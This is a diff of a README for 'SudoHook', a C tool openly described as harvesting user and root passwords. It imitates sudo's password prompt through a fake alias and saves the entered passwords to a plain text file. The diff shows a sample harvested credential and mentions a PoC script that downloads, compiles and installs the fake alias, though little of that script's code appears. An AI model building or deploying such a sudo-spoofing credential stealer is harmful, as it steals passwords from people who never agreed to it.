@@ -7,14 +7,14 @@
 
 
 ## `SudoHook is a C project made to harvest user/root passwords. `
-when the binary is executed, the user will visualise the script mimicking sudo's authentication process, the difference is that the password, when it's entered (and verified succesfully, will get extracted and appended in a plain text file, e.g:
+when the binary is executed, the user will visualise the script mimicking sudo's authentication process, the difference is that the password, when it's entered and verified succesfully, will get extracted and appended in a plain text file, e.g:
 ```
 # harvested_passwords.txt
 user: plasma-bls
 password: mypassword123
 UID: 1000 GID: 1000
 ```
-<br> Here's a PoC i made that makes everything for you (source: PoC.sh):
+<br> Here's a PoC i made that downloads, compiles, sets up  the fake alias for you (source: PoC.sh):
 ```bash
 #!/bin/sh
 
@@ -46,3 +46,5 @@ fi
 
 rm -rf "$TEMPDIR"
 ```
+
+<p>If SudoHook is useful to you, leave a star! <img src="https://i.postimg.cc/pTH5R15s/star-2b50.webp" width="30" height="30";"></p>
